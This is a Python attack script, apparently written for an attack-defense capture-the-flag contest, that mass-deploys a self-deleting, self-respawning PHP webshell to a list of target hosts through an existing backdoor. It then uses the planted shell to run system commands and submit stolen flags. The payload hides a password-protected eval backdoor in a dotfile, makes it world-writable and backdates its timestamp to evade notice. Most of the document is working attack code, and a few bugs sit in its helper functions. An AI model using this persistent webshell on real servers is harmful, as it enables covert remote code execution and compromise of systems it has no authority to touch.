# -*- coding: utf-8 -*-
# @Time    : 2019-4-09 21:33
# @Author  : Hu3sky
# @FileName: exploit.py
# @Software: Submie

import requests
import time

# ---------------------信息配置---------------------   #
token = "517ea237b94358b47233c4a45e06d406"            # 队伍token
submit_url = "http://192.168.1.110:3000/Flag/submit"  # 提交flag平台
f1=open('url.txt','r')								  # ip列表
hourse = '/include.php'   							  # 马的位置
# 不死马payload
paylaod = '''								

<?php
    set_time_limit(0);
    ignore_user_abort(1);
    unlink(__FILE__);
    while(1){
        file_put_contents('./.config.php','<?php
if(md5($_POST[\'pass\'])==\'644c2afbecb8d0764c7c8a35518827c0\')
@eval($_POST[\'cmd\']);
?>');
        system('chmod 777 .config.php');
        touch("./.config.php",mktime(20,15,1,11,28,2016));
        usleep(100);
        }
?>

'''
# --------------------------------------------------- #


def add_shell(method):
	for line in f1.readlines():
		line = line.replace('\n','/');
		shell_payload = {"cmd":"system(\'echo {0} > 1aaa.php\')".format(paylaod)}		#a是密码
		url = "http://"+line+hourse
		try:
			if(method == "post"):
				r = requests.post(url, data = paylaod ,timeout = 5)
				if(r.status_code == 200):
					requests.get("http://"+line+"/.admin.php")
					print ("[+] Successfully!,the shell is %s" %("http://"+line+"/.config.php"))
			if(method == "get"):
				r = requests.get(url, params = paylaod)
				if(r.status_code == 200):
					requests.get("http://"+line+"/.admin.php")
					print ("[+] Successfully!,the shell is %s" %("http://"+line+"/.config.php"))	

		except Exception as e:
			print ("[-] can't add shell")


def get_flag(method):
	flag = []     #存flag
	# urls = ['http://127.0.0.1:12345'] # 目标url
	# for i in range(1,255):
	# 	urls.append('http://127.0.0.'+str(i)+':12345')
	
	for line in f1.readlines():
		line = line.replace('\n','/');
		paylaod = {"a":"echo system(\'cat flag\');"} #马的密码是a
		url = "http://"+line+hourse
		try:
			if(method == "post"):
				r = requests.post(url,data=paylaod)
				if(r.status_code == 200):
					print ("[+] Successfully!,the flag is %s" %(r.text))
				flag.append(r.text)
			elif(method == "get"):
				r = requests.get(url,params=paylaod)
				if(r.status_code == 200):
					print ("[+] Successfully!,the flag is %s" %(r.text))

		except Exception as e:
			print ("[-] can't cat flag")

	return flag
			

def send_flag():
	flags = get_flag()
	for flag in flags:
		try:
			data = {
			"token":token,
			"flag":flag
			}
			r = requests.post(submit_url,data=data,timeout=3)
			print("[+]flag Successfully send!")
		except Exception as e:
			print("[-] False")


if __name__ == '__main__':
	add_shell("get")
	# get_flag("get")
	# send_flag()